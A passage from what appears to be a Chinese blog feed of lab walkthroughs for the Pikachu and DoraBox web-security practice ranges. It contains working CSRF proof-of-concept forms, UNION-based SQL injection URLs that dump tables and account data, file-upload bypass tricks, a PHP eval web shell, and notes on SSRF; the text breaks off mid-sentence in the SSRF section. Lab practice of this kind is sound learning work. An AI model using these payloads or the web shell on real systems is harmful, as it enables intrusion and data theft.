class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hehe&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;12345678<span class=\"symbol\">&amp;#64;</span>&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>发给用户点击按钮后跳转：</p>\n<p><img src=\"pikachu-csrf-002.png\" alt=\"\"></p>\n<p>修改成功</p>\n<h2 id=\"csrfpost\"><a class=\"markdownIt-Anchor\" href=\"#csrfpost\">#</a> csrf（post）</h2>\n<h3 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程</h3>\n<p>和 get 相比，就是 action 后面加了个 method=“POST”，然后就是一样的操作了</p>\n<p>poc：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phonenum&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"csrftoken没绕过去可以用bp绕把\"><a class=\"markdownIt-Anchor\" href=\"#csrftoken没绕过去可以用bp绕把\">#</a> csrf (token)（没绕过去？可以用 bp 绕把）</h2>\n<h3 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程</h3>\n<p>没绕过去，下面有个服务器给的隐藏的 token</p>\n<p>（这里可以利用 bp 自带的功能，将返回数据包中的 token 数据设置为下一请求数据包的参数）</p>\n<h3 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结：</h3>\n<p>总结之不知道自己当时在想什么导致只能浑水摸鱼系列◔ ‸◔</p>\n<hr>\n<h2 id=\"最后想说的话\"><a class=\"markdownIt-Anchor\" href=\"#最后想说的话\">#</a> 最后想说的话</h2>\n<p>只要花时间去努力，真的会变强的！！！</p>\n<p>看见自己以前写的文章，莫名落泪</p>\n<p>。</p>\n<p>突然想接一个不明觉厉ヽ (✿ﾟ▽ﾟ) ノ</p>\n<p>突然伤感氛围打破</p>\n",
            "tags": [
                "pikachu,web靶场"
            ]
        },
        {
            "id": "http://example.com/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/",
            "url": "http://example.com/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/",
            "title": "dorabox冒险手记",
            "date_published": "2020-10-15T08:40:33.000Z",
            "content_html": "<h1 id=\"sqli字符型\"><a class=\"markdownIt-Anchor\" href=\"#sqli字符型\">#</a> SQLi 字符型</h1>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程：</h2>\n<p>字符型和数字型相比，就是要闭合单引号吧</p>\n<ol>\n<li>\n<p>单引号闭合，# 用 url 编码 %23：</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 %23' &amp;submit=submit</code> <img src=\"dorabox_sqlchar002.png\" alt=\"\"></p>\n<p>下面就是和数字型注入相同的操作。</p>\n</li>\n<li>\n<p>利用 order by 或者 group by 判断字段数：</p>\n<p>正常： <code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 order by 3 %23' &amp;submit=submit</code></p>\n<p>报错： <code>http://localhost/dorabox/sql_injection/sql_string.php</code> <br>\n?title=1’ or 1=1 order by 4 %23’<br>\n&amp;submit=submit</p>\n<p>以上说明需要 3 个字段</p>\n</li>\n<li>\n<p>爆该数据库所有表和 news 表有多少条数据</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union select  1,(select table_rows from information_schema.tables where table_name='news' and table_schema = database()),(select group_concat(table_name) from information_schema.tables where table_schema = database())  %23' &amp;submit=submit</code></p>\n<p>因为没有 title 为’1’的文章，所以直接只会出后面攻击所得数据<img src=\"dorabox_sqlchar003.png\" alt=\"\"></p>\n<p>注入的三个字段：</p>\n<ul>\n<li>\n<p>1 并不会输出，所以随意</p>\n</li>\n<li>\n<p>(select table_rows from information_schema.tables where table_name=‘news’ and table_schema = database ()) ，用于统计该表的数据数量，没什么用，就是想试试看</p>\n</li>\n<li>\n<p>(select group_concat (table_name) from information_schema.tables where table_schema = database ())，利用 group_concat () 拼接字符串爆表名</p>\n</li>\n</ul>\n</li>\n<li>\n<p>爆字段</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,group_concat(column_name) from information_schema.columns where table_name = 'account' and table_schema = database() %23' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlchar004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆内容</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,concat_ws('-',id,rest,own) from account %23' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlchar005.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结：</h2>\n<p>在 sql 注入中，注释常用’–+’，而注释符’#‘和’–' 一般不能直接使用。</p>\n<ul>\n<li>‘#’：sql 手工注入时，浏览器地址栏输入的 '＃' 并没有发送到后台，因为 url 中 #号是用来指导浏览器动作的（例如锚点），对服务器端完全无用，# 的 url 编码是 %23，替换后可行</li>\n<li>‘–’：在字符型注入时，–和单引号连接在一起时，无法形成有效的 mysql 语句，可能造成单引号未闭合错误。所以可以使用–’，也可以尝试用多行注释符（块注释符 /**/）、一对英文括号、换行符或加号来代替空格</li>\n</ul>\n<h1 id=\"sqli搜索型\"><a class=\"markdownIt-Anchor\" href=\"#sqli搜索型\">#</a> SQLi 搜索型</h1>\n<p>类似字符型注入，主要就是闭合</p>\n<p><img src=\"dorabox_sqlss001.png\" alt=\"\"></p>\n<h2 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>进行闭合</p>\n<p>‘<a href=\"http://localhost/dorabox/sql_injection/sql_search.php\">http://localhost/dorabox/sql_injection/sql_search.php</a><br>\n?content=’ or ‘%’=’<br>\n&amp;submit=submit’</p>\n<p><img src=\"dorabox_sqlss002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>判断需要的字段数 3 个（感觉这种方法有点低级）</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=' union select 1,2,3 and '%'='  &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss003.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆表，常规手段</p>\n<p><code>SELECT * FROM news WHERE content like '%$$$$$$' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '%'=' %'</code></p>\n<p><img src=\"dorabox_sqlss004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆字段</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'account' and '%'=' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss005.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆内容</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, concat_ws('--',id,rest,own) from account where '%'=' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss006.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结：</h2>\n<p>sql 通配符</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">通配符</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">%</td>\n<td style=\"text-align:left\">替代 0 个或多个字符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">_</td>\n<td style=\"text-align:left\">替代一个字符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[<em>charlist</em>]</td>\n<td style=\"text-align:left\">字符列中的任何单一字符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td>\n<td style=\"text-align:left\">不在字符列中的任何单一字符</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"js限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#js限制文件上传\">#</a> JS 限制文件上传</h1>\n<p>前端进行了文件名后缀过滤</p>\n<p><img src=\"dorabox_fp_js003.png\" alt=\"\"></p>\n<h2 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程：</h2>\n<ol>\n<li>打开源代码，把蓝色框部分内容删除，即绕过验证函数<img src=\"dorabox_fp_js002.png\" alt=\"\"></li>\n<li>上传成功，路径告诉了，菜刀直连</li>\n</ol>\n<p><img src=\"dorabox_fp_js001.png\" alt=\"\"></p>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结：</h2>\n<p>遇见了一个问题，还没有解决：</p>\n<p>为什么修改 js 代码，加上 |.php 不生效，而删除函数验证一改一个准？</p>\n<p>据说就是不可以改（小菜菜，要在前端控制台输入该函数，才会生效）</p>\n<h1 id=\"任意文件上传\"><a class=\"markdownIt-Anchor\" href=\"#任意文件上传\">#</a> 任意文件上传</h1>\n<p>随便传</p>\n<p><img src=\"dorabox_fp_all001.png\" alt=\"\"></p>\n<h2 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程：</h2>\n<p>根据题目提示，获取到文件上传的路径，用菜刀直接连接</p>\n<p><img src=\"dorabox_fp_all002.png\" alt=\"\"></p>\n<p>上传的 php 一句话木马 attack.php：</p>\n<p><code> &lt;?php @eval($_POST['attack']) ?&gt;</code></p>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结：</h2>\n<ol>\n<li>\n<p>php 一句话木马基本原理：</p>\n<ul>\n<li>@表示后面即使执行错误，也不报错 ($_POST [attack] 如果不加 @会报错，因为 attack 变量没有定义就被使用了，报错会暴露密码)</li>\n<li>eval () 函数，括号内的语句字符串什么的都当做代码执行</li>\n<li>$_POST [‘attack’] 表示以 post 的方式接收变量 attack，把变量 attack 里面的字符串当做 php 代码执行。例如，若接收到参数 attack=echo ‘attack’，此时代码变为 eval (“echo ‘attack’;”)，就会输出 attack</li>\n</ul>\n</li>\n<li>\n<p>TruBW 博主举的常用的方法：</p>\n<blockquote>\n<p>你想查看目标硬盘里有没有小黄片，可以用 php 函数： <code>opendir()</code>  和 <code>readdir()</code>  等等。想上传点小黄片，诬陷站主，就用 php 函数： <code>move_uploaded_file</code> ，当然相应的 html 要写好。你想执行 cmd 命令，则用 <code>exec()</code> 。</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"mime限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#mime限制文件上传\">#</a> MIME 限制文件上传</h1>\n<p>.jpg 可以上传成功</p>\n<p><img src=\"dorabox_fp_mime001.png\" alt=\"\"></p>\n<h2 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程：</h2>\n<ol>\n<li>打开网络抓包，把后缀修改为.php<img src=\"dorabox_fp_mime002.png\" alt=\"\"></li>\n<li>上传成功，菜刀直连<img src=\"dorabox_fp_mime003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结：</h2>\n<p><strong>MIME 介绍：</strong></p>\n<blockquote>\n<p>MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定的应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。（来自百度百科）</p>\n</blockquote>\n<p><strong>常见的类型：</strong></p>\n<table>\n<thead>\n<tr>\n<th>文件类型</th>\n<th>后缀</th>\n<th>数据包中的文件类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>超文本标记语言文本</td>\n<td>.html</td>\n<td>text/html</td>\n</tr>\n<tr>\n<td>xml 文档</td>\n<td>.xml</td>\n<td>text/xml</td>\n</tr>\n<tr>\n<td>xhtml 文档</td>\n<td>.xhtml</td>\n<td>application/xhtml+xml</td>\n</tr>\n<tr>\n<td>普通文本文档</td>\n<td>.text</td>\n<td>text/plain</td>\n</tr>\n<tr>\n<td>RTF 文本</td>\n<td>.rtf</td>\n<td>application/rtf</td>\n</tr>\n<tr>\n<td>PDF 文档</td>\n<td>.pdf</td>\n<td>application/pdf</td>\n</tr>\n<tr>\n<td>Miscrosoft Word 文件</td>\n<td>.word</td>\n<td>application/msword</td>\n</tr>\n<tr>\n<td>PNG 图像</td>\n<td>.png</td>\n<td>image/png</td>\n</tr>\n<tr>\n<td>GIF 图形</td>\n<td>.gif</td>\n<td>image/gif</td>\n</tr>\n<tr>\n<td>JPEG 图形</td>\n<td>.jpeg,.jpg</td>\n<td>image/jpeg</td>\n</tr>\n<tr>\n<td>au 声音文件</td>\n<td>.au</td>\n<td>audio/basic</td>\n</tr>\n<tr>\n<td>MIDI 音乐文件</td>\n<td>mid,.midi</td>\n<td>audio/midi,audio/x-midi</td>\n</tr>\n<tr>\n<td>RealAudio 音乐</td>\n<td>.ra,.ram</td>\n<td>audio/x-pn-realaudio</td>\n</tr>\n<tr>\n<td>AVI 文件</td>\n<td>.avi</td>\n<td>video/x-msvideo</td>\n</tr>\n<tr>\n<td>GZIP 文件</td>\n<td>.gz</td>\n<td>application/x-gzip</td>\n</tr>\n<tr>\n<td>TAR 文件</td>\n<td>.tar</td>\n<td>application/x-tar</td>\n</tr>\n<tr>\n<td>任意的二进制数据</td>\n<td></td>\n<td>application/octet-stream</td>\n</tr>\n</tbody>\n</table>\n<p><strong>出现在 HTTP 数据包中可能有的位置（不是很有画面感…）：</strong></p>\n<blockquote>\n<p><strong>MIME 信息头有：</strong></p>\n<p>MIME-Version:</p>\n<p>这个头提供了所用 MIME 的版本号。这个值习惯上为 1.0。</p>\n<p><strong>Content-Type:</strong></p>\n<p>它定义了数据的类型，以便数据能被适当的处理。有效的类型有：text，image，audio，video，applications，multipart 和 message。注意任何一个二进制附件都应该被叫做 application/octet- stream。这个头的一些用例为：image/jpg, application/mswork，multipart/mixed，这只是很少的一部分。</p>\n<p><strong>Content-Transfer-Encoding:</strong></p>\n<p>这是所有头中最重要的一个，因为它说明了对数据所执行的编码方式，客户 / MUA 将用它对附件进行解码。对于每个附件，可以使用 7bit，8bit，binary ，quoted-printable，<a href=\"https://baike.baidu.com/item/base64\">base64</a> 和 custom 中的一种编码方式。7bit 编码是用在 US ASCII<a href=\"https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E9%9B%86\"> 字符集</a>上的常用的一种编码方式，也就是，保持它的原样。8bit 和 binary 编码一般不用。对人类可读的标准文本，如果传输要经过对格式有影响的<a href=\"https://baike.baidu.com/item/%E7%BD%91%E5%85%B3\">网关</a>时对其进行保护，可以使用 quoted printable 。Base64 是一种通用方法，在需要决定使用哪一种编码方法时，它提供了一个不用费脑子的选择；它通常用在二进制，非文本数据上。注意，任何非 7bit 数据必须用一种模式编码，这样它就可以通过 Internet<a href=\"https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6%E7%BD%91%E5%85%B3\"> 邮件网关</a>！</p>\n<p><strong>Content-ID:</strong></p>\n<p>如果 Content-Type 是 message/external-body 或 multipart/alternative 时，这个头就有用了，它超出了本文的范围。</p>\n<h3 id=\"content-description\"><a class=\"markdownIt-Anchor\" href=\"#content-description\">#</a> Content-Description:</h3>\n<p>这是一个可选的头。它是任何信息段内容的自由文本描述。描述必须使用 us-ascii 码。</p>\n<p><strong>Content-Disposition:</strong></p>\n<p>一个试验性的头，它用于给客户程序 / MUA 提供提示，来决定是否在行内显示附件或作为单独的附件。</p>\n<p>MIME 段头（出现在实际的 MIME 附件部分的头），除了 MIME-Version 头，可以拥有以上任何头字段。如果一个 MIME 头是信息块的一部分，它将作用于整个信息体。例如，如果 Content-Transfer-Encoding 显示在信息（指整个信息）头中，它应用于整个信息体，但是如果它显示在一个 MIME 段里，它 &quot;只能&quot; 用于那个段中。</p>\n<p>注意：其可以对自动对收到的<a href=\"https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6\">邮件</a>进行解密。</p>\n</blockquote>\n<p>[以上拓展来自这里</p>\n<h1 id=\"拓展名限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#拓展名限制文件上传\">#</a> 拓展名限制文件上传</h1>\n<p>后台进行了文件名后缀过滤，无法上传.php 文件</p>\n<h2 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程：</h2>\n<ol>\n<li>尝试大小写绕过，把文件名后缀改为.phP，上传成功，菜刀直连<img src=\"dorabox_fp_hz001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-6\"><a class=\"markdownIt-Anchor\" href=\"#总结-6\">#</a> 总结：</h2>\n<p>因为写过 upload_labs (没写完)，就有思路</p>\n<h1 id=\"内容限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#内容限制文件上传\">#</a> 内容限制文件上传</h1>\n<p>对文件内容进行判读过滤</p>\n<h2 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>在木马文件最前面加上 GIF89a:</p>\n<p><code>GIF89a &lt;?php @eval($_POST['attack']) ?&gt;</code></p>\n</li>\n<li>\n<p>上传成功，路径告诉了，菜刀直连</p>\n</li>\n</ol>\n<p><img src=\"dorabox_fp_nr001.png\" alt=\"\"></p>\n<h2 id=\"总结-7\"><a class=\"markdownIt-Anchor\" href=\"#总结-7\">#</a> 总结：</h2>\n<p>GIF89a 是文件头校验内容，服务器看到这里就会以为是 GIF 文件。</p>\n<p>常见的文件头对应关系（入职培训上的，这个我以前还找过，就是因为菜，没有找到）：</p>\n<ol>\n<li>JPEG;.JPE;.JPG，”JPGGraphic File”</li>\n<li>gif，”GIF 89A”</li>\n<li>zip，”Zip Compressed”</li>\n<li>doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>\n</ol>\n<h1 id=\"sqli数字手工注入\"><a class=\"markdownIt-Anchor\" href=\"#sqli数字手工注入\">#</a> SQLi 数字手工注入</h1>\n<p><img src=\"dorabox_sqlnum001.png\" alt=\"\"></p>\n<h2 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>输出报错：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=1\">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> order by 4 &amp;submit=submit<img src=\"dorabox_sqlnum007.png\" alt=\"\"> 正常输出：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 order by 3 &amp;submit=submit</p>\n<p>以上说明，应输出 3 个字段</p>\n</li>\n<li>\n<p>用 count (*) 统计表内数据，只有两条数据：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=3\">http://localhost/dorabox/sql_injection/sql_num.php?id=3</a> union select 10086,count(*),10087 from news order by 1 desc limit 1<br>\n&amp;submit=submit</p>\n<p><img src=\"dorabox_sqlnum002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆数据库</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 union select 3,database(),user() order by 1 desc limit 1<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum003.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆表名，利用 group_concat ()：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=1\">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> union select 3,group_concat(table_name),0 from information_schema.tables where table_schema = database() order by 1 desc<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆字段：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 union select 3,group_concat(column_name),0 from information_schema.columns where table_name = ‘account’ order by 1 desc<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum005.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆内容：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id = 1 union select 3,concat_ws(&quot;,&quot;,id,rest,own),0 from account where 1=1 order by 1 desc<img src=\"dorabox_sqlnum006.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结-8\"><a class=\"markdownIt-Anchor\" href=\"#总结-8\">#</a> 总结：</h2>\n<ul>\n<li>\n<p>mysql 字符拼接方法</p>\n<ol>\n<li>\n<p>concat()</p>\n<p>功能：将多个字符串连接成一个字符串</p>\n<p>语法：concat (str1, str2, …)</p>\n<p>说明：返回结果为连接参数产生的字符串，如果有任何一个参数为 null，则返回值为 null。</p>\n</li>\n<li>\n<p>concat_ws()</p>\n<p>功能：将多个字符串拼接成一个字符串，以自定义的符号进行分割</p>\n<p>语法：concat (separator, str1, str2, …)</p>\n<p>说明：第一个参数指定分隔符，若为 null, 返回结果也会为 null</p>\n</li>\n<li>\n<p>group_concat()</p>\n<p>功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果</p>\n<p>语法：group_concat ([distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’] )</p>\n<p>说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 句子；separator 是一个字符串，缺省为一个逗号</p>\n</li>\n</ol>\n</li>\n<li>\n<p>information_schema</p>\n<p>information_schema 数据库是 MySQL 自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括 “数据词典” 和 “系统目录”。</p>\n<p>常用表：</p>\n<ol>\n<li>COLLATION_CHARACTER_SET_APPLICABILITY 表，和字符编码相关，包含的常用列：\n<ol>\n<li>COLLATION_NAME 排序规则明</li>\n<li>CHARACTER_SET_NAME 与排序规则关联的字符集的名称</li>\n</ol>\n</li>\n<li>TABLES 表，提供库中表信息，包含的常用列：\n<ol>\n<li>Table_catalog 数据表登记目录</li>\n<li>Table_schema 数据表所属的数据库名</li>\n<li>Table_name 表名</li>\n<li>Table_type 表类型 [system view | base table]</li>\n<li>Engine 使用的数据库引擎 [MyISAM | CSV | InnoDB]</li>\n<li>Version 版本，默认值 10</li>\n<li>Row_format 行格式 [Compact | Dynamic | Fixed]</li>\n<li>Table_rows 表里所存多少行数据 (早知道有这个，我就)</li>\n<li>Avg_row_length 平均行长度</li>\n<li>Data_length 数据长度</li>\n<li>Max_data_length 最大数据长度</li>\n<li>Index_length 索引长度</li>\n<li>Create_time 表的创建时间</li>\n<li>Update_time 表的更新时间</li>\n<li>Check_time 表的检查时间</li>\n<li>Table_collation 表的字符校验编码集</li>\n<li>Chechsum 校验和</li>\n</ol>\n</li>\n<li>COLUMNS 表，提供表中字段信息，包含的常用列：\n<ol>\n<li>TABLE_CATALOG 包含该列的表所属的目录名称。该值始终为 def。</li>\n<li>TABLE_SCHEMA 字段所在数据库的名称。</li>\n<li>TABLE_NAME 字段所在表的名称。</li>\n<li></li>\n<li>COLUMN_NAME 字段的名称。</li>\n<li>ORDINAL_POSITION 表中字段的位置。（可能会用 order by ORDINAL_POSITION）COLUMN_TYPE 字段数据类型。</li>\n<li>COLUMN_DEFAULT 字段的默认值。如果字段具有显示缺省值 NULL，或者字段定义不含 DEFAULT 子句，则该值为 NULL。</li>\n<li>COLUMN_TYPE 类型名称以及别的信息，比如精度或长度（以字符为单位</li>\n<li>CHARACTER_OCTET_LENGTH 对于字符串列，最大长度（以字节为单位</li>\n<li>CHARACTER_MAXIMUM_LENGTH 对于字符串列，最大长度（以字符为单位） COLUMN_KEY 名称是否已建立索引</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h1>\n<p><img src=\"dorabox_ssrf001.png\" alt=\"\"></p>\n<h2 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程：</h2>\n<ol>\n<li>利用 file 进行文件读取<img src=\"dorabox_ssrf002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-9\"><a class=\"markdownIt-Anchor\" href=\"#总结-9\">#</a> 总结：</h2>\n<ul>\n<li>其实就是有 url 的，需要访问别的资源的就可能有 ssrf 漏洞。</li>\n<li>利用方式（里面好多没试过的，等我写完报告要去玩玩）\n<ol>\n<li>利用 file 协议读取本地文件（类似文件包含，想要利用这个漏洞，需要知道里面有什么文件或者目录，然后进行内容提取）</li>\n<li>对服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>\n<li>攻击运行在内网或本地的应用程序</li>\n<li>对内网 web 